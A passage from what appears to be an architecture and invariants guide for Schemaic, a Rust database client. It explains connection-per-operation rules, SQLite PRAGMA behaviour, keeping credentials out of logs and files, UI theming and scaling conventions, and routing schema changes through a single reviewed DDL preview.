  wraps it in a transaction of its own — a second `BEGIN` around a file that already carries one is
  not what any of the three engines does. `run_script` therefore wraps nothing, and on SQLite it
  also leaves `PRAGMA foreign_keys` alone, where `run_ddl` turns enforcement off for its rebuild:
  silently lifting the guard for a file that never asked would load rows the database would have
  refused, with no commit of ours to check before. The statements arrive over a bounded channel
  (`SCRIPT_QUEUE`), which is both the backpressure and the progress design — the reader cannot get
  more than a queue ahead, so `script::Splitter::consumed` tracks what the server has applied
  closely enough that the driver reports progress from the file position alone, with no second
  channel.
  **A streamed whole-table export fits this rule rather than bending it.** `Db::stream_query`
  connects, runs and disconnects like every other `Db` method; what is new is only how *long* that
  takes, and the bounded channel is what keeps that bounded in memory too — a server faster than the
  disk waits rather than queueing the table. Nothing is cached and no second connection path is
  added, so a `Db` call that runs for minutes is not evidence the rule has been abandoned.
  **SQLite has no exception at all** — every operation opens its own connection inside
  `spawn_blocking`, which is this invariant rather than a concession to a blocking driver, and
  `Session::open` refuses it (see `core::tx` above for why the pinned form needs its own design).
  **But the unit is the *operation*, and an operation is not a statement.** A batch, a DDL plan, an
  import and a script are each **one** — which is why `run_ddl` and `import_rows` hold a connection
  across many statements (as does `run_server_ddl`, on the three engines that have databases to
  create and drop) without any of them being named as exceptions either, and why `Db::run_batch` is not
  a third: its own doc has always promised one connection for a batch, and the other two engines
  always gave it. Its SQLite arm read that sentence per-statement instead and opened a connection
  each, on the reasoning — written into the code — that there is no `USE` to carry and no session
  state to keep. A `PRAGMA` *is* session state, on the one engine whose session
  state is `PRAGMA`: `ddl::sqlite_rebuild_sql` puts two of them in the emitted plan deliberately,
  because that plan is also what the preview's Copy and "Open in editor" hand a query tab, and both
  were inert under a per-statement runner. `PRAGMA foreign_keys = OFF` is statement 0, and was gone
  by the `DROP TABLE`, whose implicit `DELETE FROM` then fired every `ON DELETE CASCADE` and emptied
  a child table the user never touched, on a plan that reported success — measured on SQLite 3.50.4,
  the same statement list leaves that table with 0 rows a connection per statement and 2 rows on
  one. `PRAGMA legacy_alter_table = ON` was likewise gone by the shadow table's
  `ALTER TABLE "t_schemaic_rebuild" RENAME TO "t"`, so a view over the edited table failed that
  statement *after* the `DROP TABLE` and outside any transaction, leaving no table under the real
  name and a `t_schemaic_rebuild` under the shadow one that `ddl::REBUILD_SUFFIX`'s own doc says
  nothing ever sees. `sqlite::run_batch` is that arm now — one connection in one `spawn_blocking`,
  `sqlite::rebuild_fk_tests` pinning both cases — and the reading to keep is that a deviation
  towards *more* connections than the rule asks for is exactly as unsanctioned as one towards
  fewer.
  In-transaction writes nest under a `SAVEPOINT` (`TxScope`; on SQL Server `SAVE TRANSACTION`,
  `mssql::WriteScope::Savepoint`) so the 1-row guard can roll back its own
  batch without ending the user's transaction, and the transaction *state* is the pure, tested
  `schemaic_core::tx::TxState` — engine divergence (PG poisons on error, MySQL implicitly commits on
  DDL, SQL Server's is read off the server) belongs there, not in UI conditionals. **Asking the
  server is the fallback wherever the statement's text cannot carry the fact, and there are three
  such places** on MySQL; on SQL Server it is not the fallback but the rule, the session asking
  after every statement (`tx::probes_after_every_statement`, under `core::tx`), because there no
  text decides it. The original is a
  *failed* statement: `implicit_commit` gates the round trip, `failure_committed` decides, and the
  outcome is `StmtOutcome::FailedAndCommitted`. The other two are *successful* statements sharing
  one line — a MySQL `SET autocommit` and a replication `START`, the two things `tx::tx_after` says
  `Ask` for — and both clear `in_tx` and upgrade the outcome to `StmtOutcome::OkAndClosed`, which
  is how the pill, which cannot ask, gets the answer too. The probe answers all three: `tx_alive`
  (private to `session.rs`) tries, on MySQL, `@@in_transaction` — MariaDB's, exact, no privilege needed, counts
  a read-only transaction — and falls back to a scoped `information_schema.INNODB_TRX` count, which
  both servers have and which needs the `PROCESS` privilege the Server Activity panel already
  assumes. It misses a transaction that has done no InnoDB work, which is harmless here because one
  with nothing in it has nothing to lose. Neither answering yields `None` and the conservative
  reading; PostgreSQL is not asked at all, its DDL being transactional and its failure state already
  exactly `Poisoned`. This is the wire-status answer `implicit_commit`'s own doc names as the thing
  that would replace its keyword guess, so it is asked only where the guess is not good enough.
  `Session::fetch_query` also checks the cancellation token **twice** — before taking the session
  lock and again after — because the lock *is* the wait: a `commit_writes` or the re-fetch after one
  can hold this connection for minutes, and a run queued behind it that the user or the statement
  timeout cancels never reaches the server. That is what makes `StmtOutcome::NotSent` reachable, and
  it also makes the outcome deterministic, since every arm below ends in a `tokio::select!` against
  `cancelled()` and `select!` polls ready branches in **random order** — the same coin flip
  `sqlite`'s `refuse_if_cancelled` documents from a real CI failure.
  **Schema-editing DDL is the case that fits neither half** — it is the tab's own work *and* a write,
  so it takes the fresh connection and then queues there behind the lock the tab's own uncommitted
  `SELECT` holds. Two things keep that from being an unexplained hang, and a new write path off the
  session should ask both questions: the app raises a `TxPrompt` per `tx::ddl_blocking_tabs` (open
  transactions on the *connection* — Schemaic doesn't track which tables one has touched, so anything
  narrower would miss the case) before applying, and `run_ddl`'s connection carries
  `db::lock_wait_sql` so a lock nobody could ask about comes back as an error instead of never.
  A second best-effort statement rides beside it on both DDL runners — `export::literal_mode_sql`,
  so the plan's `sql_literal` output means what it says (see `core::export`) — and it is scoped to
  the plan for exactly the reason the one-connection rule makes that cheap: this connection runs one
  reviewed plan and is disconnected on the way out, so nothing it sets outlives the call.
- **Connection identity is the `Db` handle / `conn_id`, never a `mysql://user:pass@host/db` URL.**
  Credentials go through `OptsBuilder`; never in a URL, argv, or log. The MCP subprocess gets its
  endpoint via a `--mcp-config` file, not argv — or, for a harness whose only configuration
  lever *is* argv, via a private file whose **path** rides in `--endpoint-file` while the endpoint
  itself never leaves the file (`harness::codex_mcp_overrides`, `ai::endpoint_file_arg`). The same
  `--endpoint-file` route carries Antigravity, whose registration writes that command line into the
  CLI's **own config**: a path there outlives the process, which is one of the two reasons
  `antigravity::sweep` exists. **Both files live in `ai::mcp_dir()`, which is ours and `0o700`,
  rather than the shared temp directory they used to**: they held a plaintext password, and in a
  directory every account on the machine can list, `O_EXCL` plus a random name was the whole of the
  defence. **They no longer hold it at all** — owner-private stops another account, not the agent,
  which runs as the user and whose file readers can be pointed at the file — so the endpoint names
  its saved connection and `ai::saved_db` reads the password from the keyring (the `ai.rs`
  entry has the whole of it, including the executing harness it does not stop). And a subprocess that cannot read the file it was pointed at **refuses** rather than
  defaulting — `ai::mcp_endpoint_from_env` returns `Err`, because the fallback was a
  `127.0.0.1:3306` endpoint with every access gate back on. Don't add new plaintext-secret surfaces.
  **"Never in a log" includes a log the environment asked for.** `app::logging`'s
  `log_directives`/`filter_for` append `russh=warn`, `russh_cryptovec=warn` and `russh_util=warn`
  *after* whatever `RUST_LOG` said, because `RUST_LOG` **replaces** the default filter rather than
  adding to it, `tracing-subscriber`'s `tracing-log` bridge brings every dependency's `log` records
  in, and `russh` traces the packet body before encryption — so `RUST_LOG=trace` wrote the SSH
  tunnel password into
  `schemaic.log` in cleartext, in the folder Settings offers an **Open folder** button for. A
  dependency that logs a secret gets a line in `CREDENTIAL_TARGETS`, appended last so the floor
  outranks an equal key; never a `debug!` we hope nobody enables.
  **And it includes a `Debug` nobody has written a call site for yet.** All four types that carry a
  credential have a hand-written one now — the fourth, `core::entra::AzureToken`, below. `Db` prints `pass: "<redacted>"` and everything else,
  because the derived one printed the password: no site formats a `Db` today — the whole workspace
  was checked, which is what made the derive latent rather than live — but the type is threaded
  through nearly everything (`McpEndpoint`, `StartAiParams`, the dump and script runners), and the
  moment a struct that owns one gains a `#[derive(Debug)]` and is logged, or anyone writes
  `.expect(&format!("{db:?}"))`, the credential lands in `%APPDATA%\Roaming\schemaic`'s log — the
  folder the Settings pane invites the user to share for support. `core::connection`'s `Connection`
  and `SshTunnel` are the structs `Db::connect` reads *from*, they carry three secrets between them
  (the DB password, the SSH password, the SSH key passphrase), and they kept the derive until the
  same treatment reached them: a `tracing::warn!(?tunnel, …)` on a failed handshake is the obvious
  next line for anyone debugging one, and it would have written two of the three into the log file
  Settings invites the user to attach to a bug report. A secret field goes through the private
  `Redacted` wrapper, which prints `<empty>` or `<redacted>` — whether a secret is *set* is the half
  that explains the failure anyone is printing this for, and it is not the half that leaks. Both
  impls name their fields one at a time rather than filtering a `finish_non_exhaustive` set, so a
  field added later is **omitted** until someone lists it; omission is the safe direction, a new
  secret joining the output silently is not.
  `formatting_a_connection_prints_none_of_the_three_secrets_it_holds` and
  `formatting_a_tunnel_prints_neither_its_password_nor_its_passphrase` pin both directions — no
  secret out, and the host, user and key *path* still in, because a log line that cannot say which
  server it is about is worth nothing. Each struct's own doc already claimed the property; a derived
  `Debug` was an unguarded second spelling of the same leak.
  **An Entra token is a credential too, and it is held to the same rule.** `AzureToken` — a bearer
  token, as good as a password until it expires — was written with its redacting `Debug` from the
  start (`a_token_is_read_from_the_clis_answer` asserts it never prints). It is never on an argv:
  the request is `core::entra`'s constant arguments and the token comes back on the CLI's piped
  stdout. It is never on disk: `db/entra.rs` holds it in process memory, the MCP endpoint carries
  the mode and not the token, and `sqlcmd` is refused an Entra connection rather than handed one.
  **The two clouds' IAM tokens are held the same way** (`db/cloud_iam.rs`): process memory only,
  never written, the endpoint carrying the mode, and every external client refused an IAM
  connection (`AuthMode::external_client_refusal`). They are bare `String`s, as the password is,
  so the guard is that nothing holding one formats it — `Cached`, the cache's entry, derives no
  `Debug`, and adding one would print the token. Unlike Entra's request, AWS's argv carries the
  connection's host and user, which is why they pass `launch::cli_flag_value` first.
  **And it includes a script the user asked for a copy of.** The DDL preview's *Copy* and *Open in
  editor* both put their text somewhere durable — the OS clipboard, which on Windows persists in
  Clipboard History and cloud-syncs, and a query tab whose text the next session save writes into
  `tabs.json` in the clear — so the plans that carry a plaintext credential,
  `CREATE USER … IDENTIFIED BY '…'` and now `ALTER USER … IDENTIFIED BY '…'`, were leaving through
  both while three doc sites said it was
  "never persisted, never logged". What goes out is `ChangeSet::export_script`, which re-emits from
  a set cloned with `ddl::PASSWORD_PLACEHOLDER` in each secret's place; the modal still *renders*
  the real statement, because a preview showing a blanked-out plan is not showing the plan. The
  clone drops a PostgreSQL plan's `scram_salt` along with its password, or it re-emits a verifier
  *of the placeholder* and the copy has nothing left to replace (`ddl.rs` has the whole of it).
- **Connection secrets persist to the OS keyring, not `connections.json`.** DB/SSH passwords and the
  SSH key passphrase go through `schemaic_core::secrets` (`SecretStore` seam) + `schemaic-conn`'s
  keyring-backed store; the JSON on disk is blanked and hydrated on load. All connection saves route
  through `conn::secrets::{load,save}_connections`/`forget_connection` (which wrap
  `persist::{load,save}_connections`) — never call `persist::save_connections` directly from a front
  end, or you reintroduce plaintext. **Nor does the AI panel's MCP endpoint carry one** — it
  names the saved connection (`conn_id`) and its subprocess reads the password from the keyring (`ai::saved_db`), because an owner-private file is still one the
  agent's own file readers can open. Plaintext in the JSON is a *fallback only* for a machine with no
  working keyring — **and the app now says so when it happens**, rather than letting a stated
  invariant be quietly false on someone's machine: `Sanitized::notice` names the file the passwords
  landed in and the button that opens its folder, `Hydration::notice` names a keyring that would not
  answer and says the stored secrets were *not* deleted, and both reach the user (the startup ones
  through `persist::queue_notice`, a mid-session save's through `save_connections`' return value and
  `main.rs`'s `persist_conns`). A refused *delete* is the third case and is reported only for a
  secret this session actually read a value out of. See `core/secrets.rs` and `conn/secrets.rs`.
- **Own per-entity signals in a child `Scope`; dispose it *deferred*.** A `Tab`/`ConnNode` creates
  its signals in `parent.create_child()`; removal disposes that scope via
  `exec_after(Duration::ZERO, …)` — one tick later, after the keyed `dyn_container` has unmounted
  the old view. Synchronous disposal frees signals a still-mounted view reads this frame → panic.
  Same for any "replace + free" of scoped state.
  **`ConnNode` was the exception and is not any more**, and what it cost is the shape to recognise.
  Its three signals were created directly on the scope `new` was *handed* — the schema tree's shared
  node scope — which is deliberately kept alive across a **reload**, so that surviving rows hold
  their schema up while the re-introspection runs. A database dropped from another client therefore
  vanished from `db_nodes` with its `RwSignal<SchemaState>` still installed, and a `Loaded` holds an
  `Arc<DbSchema>`: every table, column, index, key, view, check and trigger of that database,
  unreachable and retained until the app exited or a connection switch happened to replace the whole
  scope. `ConnNode::cx` is `cx.create_child()`, and the load disposes the departed nodes' scopes
  deferred and only when the scope above them is staying — on a switch the existing `old.dispose()`
  takes the generation, children included. `disposing_one_node_frees_its_schema_and_leaves_its_neighbours`
  is the pin, and it fails on the **survivor** assertion with `create_child()` removed: that is the
  property separating a child scope from its parent, and the one a test of `Scope::dispose` alone
  would not see. A long-lived shared scope is the amplifier to look for — the leak is invisible for
  as long as nothing replaces it.
  **The mirror image is a callback that outlives the scope it reads**, and a window-global menu is
  the usual carrier: an entry on the shared popup channel is an `Rc` closure over a cell's signals,
  and nothing clears that channel when the cell goes away. Two defences and both are needed — the
  control takes its **own** menu down in `on_cleanup` (`widgets::close_picker`, at the anchor
  `open_picker` returned, held in a plain `Cell` because a signal read inside `on_cleanup` is the
  hazard the cleanup exists to prevent), and the actions those entries call open with
  `GridState::alive()`, which is `rs.try_get_untracked().is_some()`. Since `get_untracked` is
  `try_get_untracked().unwrap()`, the failure this prevents is a panic that takes the window and
  every tab's uncommitted edits — not a no-op.
  **The binary panel's write sink is the same shape, and this is the mechanism that satisfies the
  rule for it.** `BlobUi::stage` is window-scoped and holds a `BlobStage` closing over one grid's
  `GridState`, while the file dialog it is used behind is not window-modal (floem's `open_file` is a
  plain `std::thread::spawn`), so the grid can be disposed while the user is still choosing a file.
  Three parts, and the first two are the same pair as above: the sink carries its own `live` closure
  and `BlobStage::put` asks it *inside* itself, so no caller can skip the check; and
  `GridState::stage_bytes`/`stage_new_bytes` open with `alive()`. The third is the cleanup —
  `grid_view` clears the signal **when the installed sink answers `false`**, an identity-free test,
  which is what keeps it correct with several grids alive: only a dead grid's cleanup runs, and only
  that grid's sink is dead. That third part is not redundant with the first two, because they stop
  the panic and it stops the *offer*: without it the user waited out a file dialog and a read of up
  to 64 MiB to be told the cell could not be written.
- **Themable colors reach reactive styles as `fn() -> Color`, never a captured `Color`.** A `Color`
  read once at build freezes and won't follow a live theme switch; pass the fn and call it inside
  the `.style(move |s| …)` closure (see `FieldCfg::background`).
  **A `match` that picks a colour alongside something else is the spelling this hides in**, and the
  type annotation is the whole of the fix: `monitor_view::entry_row` bound
  `let (label, color) = match entry.change.kind { … }` with `theme::chip_active()` *called* in one
  arm and the two fixed literals in the others, so it read as three uniform arms and was one
  resolved colour. The rows are keyed on `MonitorEntry::seq`, so a theme switch rebuilds none of
  them — which is what turns a frozen colour into a permanent one: UPDATE labels stayed in the
  previous theme's colour for as long as the modal stayed open, beside INSERT and DELETE labels that
  had repainted, in the one place where colour is the only thing telling the three kinds apart. The
  arms are all `fn`-shaped now (`fn() -> Color` on the binding), so the call happens inside the
  style closure that re-runs. A never-rebuilt view is the amplifier to look for: a captured `Color`
  in something floem tears down often is a flicker, and in something it never tears down is two
  themes on screen at once. `ai_panel::tool_chip`'s status dot was the same tuple spelling — three
  `theme::…()` calls resolved at build time and closed over, thirty lines above `result_view`, which
  asks the same question and calls them *inside* its own closure — and is the selector now.
  **There is exactly one place the rule cannot be followed, and it is written down at the site
  rather than treated as an exception to be re-derived.** `markdown::render_markdown` resolves
  `theme::bubble_claude_text()` once and bakes it into a `rich_text` `AttrsList`, which is not a
  style closure and cannot take a `fn`. What makes that safe is the caller: `ai_panel`'s bubble
  `dyn_container` is keyed on `theme::ui_generation()`, which `set_ui` and `set_ui_scale` bump — the
  only two things that change a UI colour or size — so every bubble is rebuilt on a theme change,
  and that key's own comment names this baked colour as the reason it exists. Narrowing the key is
  therefore a change to that function's correctness from 900 lines away, which is what the note now
  says at both ends.
  **The half of this rule a scan can settle has a gate — `theme::color_arg_gate` — and the other
  half deliberately does not.** Five review passes were spent establishing that before it was
  written down: a `theme::` accessor returns a `Color` by value, so a site is wrong iff the colour is
  produced *outside* the closure that paints it **and** the view holding it is not rebuilt on that
  colour's axis — both properties of the enclosing construct rather than of the line the token sits
  on. The fully corrected grep is ~2% precise (six true violations in 273 candidates), and worse, the
  deciding site frequently holds no `theme::` token at all: the crate has fifteen helpers returning a
  bare `Color`, each correct in itself, with the rule decided at the caller. `monitor_view`'s was the
  proof — the violation was `("INSERT", new_color())` in the tuple destructure above, while
  `new_color`'s body, the only place a grep hits, was fine. What *can* be asserted is the half that
  is **empty by construction**: every colour a view is *given* is declared `fn() -> Color`, so the
  gate fails on any `name: Color` parameter or field outside `themes.rs` — where the palettes are
  defined, and are bare `Color`s by definition — unless it is in `EXEMPT` with its reason. That
  emptiness is worth a gate precisely because it would grow silently: `fn row(c: Color) -> impl
  IntoView` compiles and reads fine and is the argument-position capture this invariant exists to
  prevent. The exemptions are all code that *computes with* a colour rather than painting one —
  `contrast.rs`'s luminance and `over`, `erd_view`'s `tinted_border` and its `#rrggbb` SVG
  formatter, the `fade` closures in `overlays.rs` — and `markdown.rs`'s `base`, the one exception
  above, is in the list as the **known latent instance** with the three conditions that make it safe,
  so the day one of them stops holding a reader finds an entry rather than nothing.
  `every_exemption_still_names_a_real_parameter` is the floor `dividers::scaled_arg_gate` keeps for
  the size half: an exemption naming a parameter that no longer exists is a stale licence the next
  `Color` at that spelling would inherit.
- **And so do sizes**: a design token that boxes, indents or spaces text is a `fn() -> f32`/`fn() ->
  f64` reading the interface scale (`theme::font_body()`, `consts::row_h()`, `theme::scaled(…)`),
  never a `const`. Same mechanism, same reason — the `.style` closure that *calls* the metric re-runs
  when the scale changes, and a `const` can never re-evaluate. **This extends to a size passed as an
  argument**: `FieldCfg::font_size` and `highlight_text`'s size are `fn() -> f32`, because a caller
  that resolves `theme::font_body()` at build time freezes the value just as surely as a `const`
  would. If a size ends up inside something that isn't a style closure (a text `Attrs` list, an
  editor `Styling`), pass the fn and read it *there*. **The exception list lives on `consts.rs`'s
  module doc, and is enforced from `unscaled_const_gate::EXEMPT` beside it** — extend both there,
  not here. The prose alone was found short five times, because prose cannot fail; the array is what
  fails now, and the doc stays as the explanation. What it says today is that an
  unscaled length is a hairline, an editor-relative metric (the code font has its own size setting
  and the scale doesn't touch it), the seed for a persisted width the user dragged, an **icon base**,
  or `TERM_FONT_SIZES` (the terminal font, which the scale deliberately doesn't reach either).
  **The air a floating box keeps from a panel edge is no longer on that list**: it is
  `consts::float_inset()`, it scales, and `consts::float_inset_gate` is the source gate — with the
  exception list as *data* — that keeps a twelfth site from inventing a sixth number. That entry
  used to read "`GRID_BAR_INSET` (5.0) and `SELECTION_BAR_INSET` (8.0), and whether those two should
  scale is unsettled", because the honest answer needed the app on screen at 160% and no test can
  see a gap. Looked at: the 10–12px gaps read correctly there and the 5–7px ones read tight against
  surroundings that had all grown, so a base of 8 (→ 13 at 160%) replaced all five numbers. A
  *second, gentler curve* was the other candidate — it would have kept 100% pixel-identical — and it
  was rejected because `scale_at` is the only curve in the app (`scale_font_at` delegates rather than
  being a second rounding rule) and a third category would make every future length a taste decision
  between "scales", "doesn't" and "scales a bit". Five numbers for one gap is what that costs. The
  trade taken instead is that 100% moves: the grid's bars loosen from 5, the ER diagram's tighten
  from 10 and 12, and the selection summary — already 8 — is unmoved. The icon bases are the
  two-way trap: `icons::icon(markup, size)` takes a **base** size and scales it itself, so never hand
  it an already-scaled value, which is what `consts::COMPLETION_ICON_BASE` and
  `consts::SCHEMA_ICON_BASE` exist to spell out — and scaling the base constant too would square the
  factor. One more exception is a *shape* rather than a name, and no textual sweep can find it: a
  `border_radius` that is **half a scaled box** is a circle or a pill, not a shape constant, so it
  has to move with the box — a `scaled(8.0)` dot with a fixed 4px radius is a rounded square at 160%,
  in a list where the dot is the only colour cue. Five sites crate-wide, and all five now derive the
  radius from the box they round: the connection colour dot (`dot / 2.0`), the jump-to-bottom circle
  in `widgets.rs`, `properties.rs`'s `bar_h() / 2.0`, `connection_form`'s colour swatches
  (`box_w / 2.0` over a `scaled(18.0)` box) and `settings::themed_toggle`'s track
  (`track_h / 2.0`) — the last two were a literal `9.0`, which is a rounded square at 160%. It is
  *not* the `SEGMENT_RADIUS` case (a shape inside a box that scales), and grepping for an unwrapped
  literal cannot tell the two apart.
  **`max_width` is the sub-class where a frozen number is a legibility bug rather than a cosmetic
  one, and it turned out to be a class of fourteen.** It is the one geometry property in
  `schemaic-ui` that always bounds *type* — a validation message, a warning paragraph, a diagnostic
  tooltip, the completion popup — and the `font_size` beside it scales in every one of those, so a
  bare literal is a box that stays 460px while the sentence inside it grows ~1.6× at **Huge**, and
  floem's default `TextOverflow::Wrap` then turns a one-line error into two or three inside a footer
  whose height is fixed. The messages it happens to are the longest ones each draft produces, which
  are the ones the user needs to read. The review filed **four** sites in two files; there were
  fourteen across ten, the other ten being the same line copied into `object_editor`,
  `event_editor`, `routine_editor`, `completion`, `ddl_preview`, `editor_pane` and `import_view` —
  a finding filed against two files turning out to be a class. Six of the fourteen were the schema
  editors' footer status, byte-identical in five, and are now `widgets::footer_error`.
  `table_designer`'s own `width_scale_tests` block exists for exactly this defect and could see none
  of them: it enumerates the file's `fn() -> f64` width functions, and a literal written inside a
  `.style(move |s| …)` closure is not one. `ui::scaled_text_width_gate` is the source gate over
  `.max_width(`/`.max_height(` with a bare float, and it starts with an **empty** allowlist and
  should keep one. Deliberately narrow: `min_width`/`min_height` carry 220-odd literals in the
  crate and nearly all are `0.0` (the flex contract `widgets::modal_footer_split` documents) or a
  floor in the tens of pixels that keeps a column from vanishing, and `width`/`height` at
  `1.0`/`2.0` are hairlines and scrollbar geometry — a border's question rather than a font's. Those
  want their own argument, and a gate that swept them in would have needed a thirty-line allowlist
  on day one, which is how a ratchet becomes laundering.
- **Pure logic lives in `schemaic-core` with unit tests** — SQL boundaries, edit-model analysis,
  export (incl. CSV formula-injection guard), diff, DDL. The UI keeps thin wrappers.
  **One function in the crate breaks the no-filesystem rule its tests otherwise keep, and it is a
  deliberate trade**: `export::export_xlsx_chunks` drives `rust_xlsxwriter` in `constant_memory`
  mode, which spills each finished row's XML to a library-managed temp file so an export costs a
  bounded buffer at any row count. The alternative holds the whole workbook in memory — 10M cell
  structs at 200k × 50, before a byte is compressed — which is exactly the size the streaming path
  exists for, so the bound is worth more than the purity. The file is created and removed inside the
  call, so a test of it is still deterministic and still needs no server; it is the same pragmatic
  exception in-memory SQLite already is in `schemaic-db` and `cli::catalog`'s tests. Read it as the one case, not as licence
  for a second: anything else wanting a file still models it at the boundary.
- **What the source knew is carried, never re-derived from the text it rendered into.** Two
  separate defects turned out to be one shape — a precise oracle two functions upstream, dropped by
  a type, then guessed at downstream from a string — and both were fixed by carrying the fact
  rather than by adding a cleverer check. `import::Record::sheet_errors` carries calamine's
  `Data::Error` positions beside the fields, because `cell_text` renders such a cell in Excel's own
  spelling and by the coercer's turn `#N/A` from a broken formula is byte-identical to `#N/A` typed
  into a `status` column: the ten-spelling table that tried to tell them apart refused an ordinary
  workbook **whole**. `edit::TsvBlock::split` counts the copied cells holding a tab or a newline as
  the block is built, because on the clipboard a separator and a cell's own tab are the same byte,
  so no paste — this grid's or a spreadsheet's — can tell afterwards, and a split cell leaves the
  row count right so nothing downstream even has a reason to look. Both fixes were cheap for the
  same reason: the oracle already existed and a type was throwing it away. Where a reading is
  available only at the point the data is produced, produce it there and carry it — a downstream
  re-derivation from rendered text is the bug, not the fallback. **Carrying it means carrying it
  truthfully**: `DbError::modal_source` reads whose words an error is off the variant, and
  `schemaic-db` wrote its own refusals and the failures of its own set-up statements as
  `Query`/`Connect`, so the carried fact was wrong at the source and the editor bar offered
  *AI fix* on Schemaic's sentences. `DbError::Refused` is the variant that lets the producer say
  so (`schemaic-db`'s `DbError` entry).
- **Generated DDL is never run silently, and never emitted from a second differ.** Every
  schema edit goes `TableDraft`/`ViewDraft` → `ddl::diff`/`diff_view` → `ChangeSet::emit` →
  the preview modal → `Db::run_ddl`. **`Db::run_server_ddl` is on the same rule, not beside it**:
  `CREATE`/`DROP DATABASE` reach it through the same preview, from `ddl::server_level` →
  `ChangeSet::emit` → `ddl_preview::preview_container`, and it is a second *runner* rather than a
  second emitter — the two statements can take neither of `run_ddl`'s commitments (see it above).
  `Db::run_ddl_piecewise` is a third runner on the same rule — `run_ddl` with its transaction left
  out, for the plan SQL Server refuses inside one — and the plan chooses it
  (`ChangeSet::runs_whole`), never the caller.
  Don't add a path that builds `ALTER`/`CREATE`/`DROP` text somewhere else, and
  don't add one that applies a plan without the preview — the preview is where the destructive
  consequence is stated in plain language and where "Open in editor" hands the script over.
  **A dump is on the written side of this rule rather than an exception to it.** `core::dump::plan`
  composes a file out of the emitters that already exist — `TableInfo::create_ddl`, `ddl::view_ddl`,
  `TriggerInfo::create_sql` and `ChangeSet::emit` for the closing foreign keys — and `cli::dump`
  writes it to disk; nothing on that path can execute it, which is exactly the standing Copy DDL has.
  A second emitter would be the regression here, not the missing preview.
  **`core::compare` is on the differ side of the rule, and it is the only aggregate.** A schema
  comparison decides what differs by asking `ddl::diff` and its per-kind siblings — there is no
  field-by-field comparison in that module — and its `SchemaPlan` is a list of single-object
  `ChangeSet`s whose `emit` is exactly theirs in order, so it adds neither a differ nor an emitter.
  Its prose answers (`summaries`/`destructive`/`unsupported`) do prefix each line with the object it
  belongs to, a plan's title being a count rather than a name, but no *statement* is built there. **And the UI it has now is on the written side of the rule too**:
  `ui/compare_view.rs` builds a `SchemaPlan` from what is ticked and hands it to
  `ddl_preview::preview_of_plan`, which fills the same `DdlPreview` a one-table designer edit fills —
  so a compare plan takes the same preview, the same Apply and the same `Db::run_ddl`, and reads its
  `scope` and `whole` off every set's changes rather than letting the caller pick a runner. A compare that
  applied its own plan without the preview would be the path this rule forbids, and the aggregate is
  where doing so would be cheapest: it already holds every statement in order. **`schemaic compare`
  is on the written side as `cli::dump` is**: it prints the same plan's `export_script()` to stdout
  and runs none of it, so its servers see catalogue reads alone (`cli/run.rs`'s `run_compare`, which
  prints `cli::compare::report`).
  **Nor is a plan applied in part**: what the dialect can't express is `ChangeSet::unsupported()`,
  the preview names each one and Apply refuses while it does — on the action, not only on the
  disabled button. The "INCOMPLETE" preamble that carries the same omission *out* through Copy and
  Open in editor is **`ddl::withheld_header`**, one `pub` free function over any list of withheld
  items, which `ChangeSet::editor_script` and `compare::SchemaPlan::editor_script` both delegate to;
  a second copy
  of that sentence would be a second thing to keep true, and the aggregate that joined statements
  without it produced a script that read as complete.
  **And every builder that joins emitted statements for a reader goes through
  `ddl::client_script`.** There were three; `SchemaPlan::script` went first, and `ChangeSet::script`
  — the shorter and more obvious name — survived that deletion with no production caller at all,
  which is worse rather than safer: a single-object set is exactly where a MySQL trigger or routine
  body *does* live, so what that name handed a user to paste was a compound body the app's own
  splitter cuts at its internal `;` — the ERROR 1064 fragment the `DELIMITER $$` wrapping exists to
  prevent. What is left is `editor_script` on the set and on the plan, plus their `export_script`
  counterparts, all four of them behind `client_script`.
  **There was a live fifth for as long as that sentence had been written down.** `app/mcp.rs`'s DDL
  tool joined `changes.emit()` raw for the agent, in a crate the guard's corpus did not include,
  under a commit message declaring the class closed at four. It asks `changes.editor_script()` now,
  which also brings it `withheld_header` — so a plan this engine refuses part of no longer reads to
  the model as complete.
  `source_gate::tests::nothing_joins_the_emitted_statements_outside_client_script` is the third
  spelling of the guard and the first that could have seen that fifth. It reads
  `source_gate::workspace_sources()` — this crate plus `schemaic-app`, `schemaic-core`,
  `schemaic-db`, `schemaic-conn` and `schemaic-cli`, the last because that DDL tool's file moved
  there and taking it out of the census would have taken it out of this gate — and asks about the *expression* rather than one spelling: every `.emit()`, then
  the rest of its statement for a `.join(` or a `.concat(`. The version before it matched the
  single literal `emit().join(` in the production halves of `ddl.rs` and `compare.rs` alone. Its
  needle is assembled rather than spelled, or the assertion's own source is the hit and the gate
  passes on itself, and it carries a floor (`seen >= 5`) because a scan that matches nothing
  reports success. **It lives in `schemaic-ui` and not in `schemaic-core`'s `tests/`, where it
  started**: a workspace-wide scan from there needs a second copy of `source_gate::production_code`
  — `schemaic-ui` depends on `schemaic-core`, so the dev-dependency back is a cycle — and a second
  copy of that walk is the thing `source_gate` exists to prevent. A stub carrying the pointer stays
  at the old site in `core/ddl.rs`, so a reader who greps for the rule where it used to be lands
  somewhere that names where it went. **`supports_change` has to be as narrow as the change is**, or `unsupported()`
  is blind: its account arm answered for all six variants on "does this engine have accounts",
  which is true of `GRANT … ON *.*` on PostgreSQL and of `ON SCHEMA` on MySQL, neither of which has
  a grammar there — so there was no INCOMPLETE header and Apply was enabled over a statement the
  server would refuse. It now asks `users::levels_for` for the two changes that carry a level.
  **And a capability can be sound while the model under it cannot answer the question** — the same
  rule one level finer than a `SqlDialect` can express, which is where it was missed.
  `users::supports_password_reset` asked a `PrincipalKind`; `from_mysql_rows` labels every MySQL 8
  row a `User` because that catalogue publishes no `is_role`, a decision made for the *read* screen
  and documented as such. Each half read correctly on its own and the composition offered **Reset
  password** for a role, which 8.4.11 accepted an `ALTER USER … IDENTIFIED BY` for
  (`authentication_string` 0 → 70 bytes, `password_expired` `Y` → `N`, measured on
  `127.0.0.1:3307`) while MariaDB 10.11.14 answers `ERROR 1396`: one dialect over two servers that
  disagree, and the predicate's own rustdoc asserting they did not. The repair widens the **model**
  rather than the gate — `Principal::role_ambiguous` carries the uncertainty a label cannot, the
  gate reads it as a third term, and the offer is withheld where the catalogue cannot classify the
  row. So the question to ask of a new capability is not only "is this about an engine" but "can the
  thing I am asking represent *not known*"; where it cannot, the fix belongs where the model is
  built. And it is pinned where the halves meet:
  `a_role_the_server_made_is_never_offered_a_password_reset` asserts over `fetch_principals`' own
  output on a real server, red on the `mysql::` leg alone, because the unit test that built a
  `Principal` with `kind = Role` and asked the predicate was green throughout.
  Which gate to ask depends on the question: `supports_change` for a single change
  with no draft behind it, and for an editor the capability for *that object* —
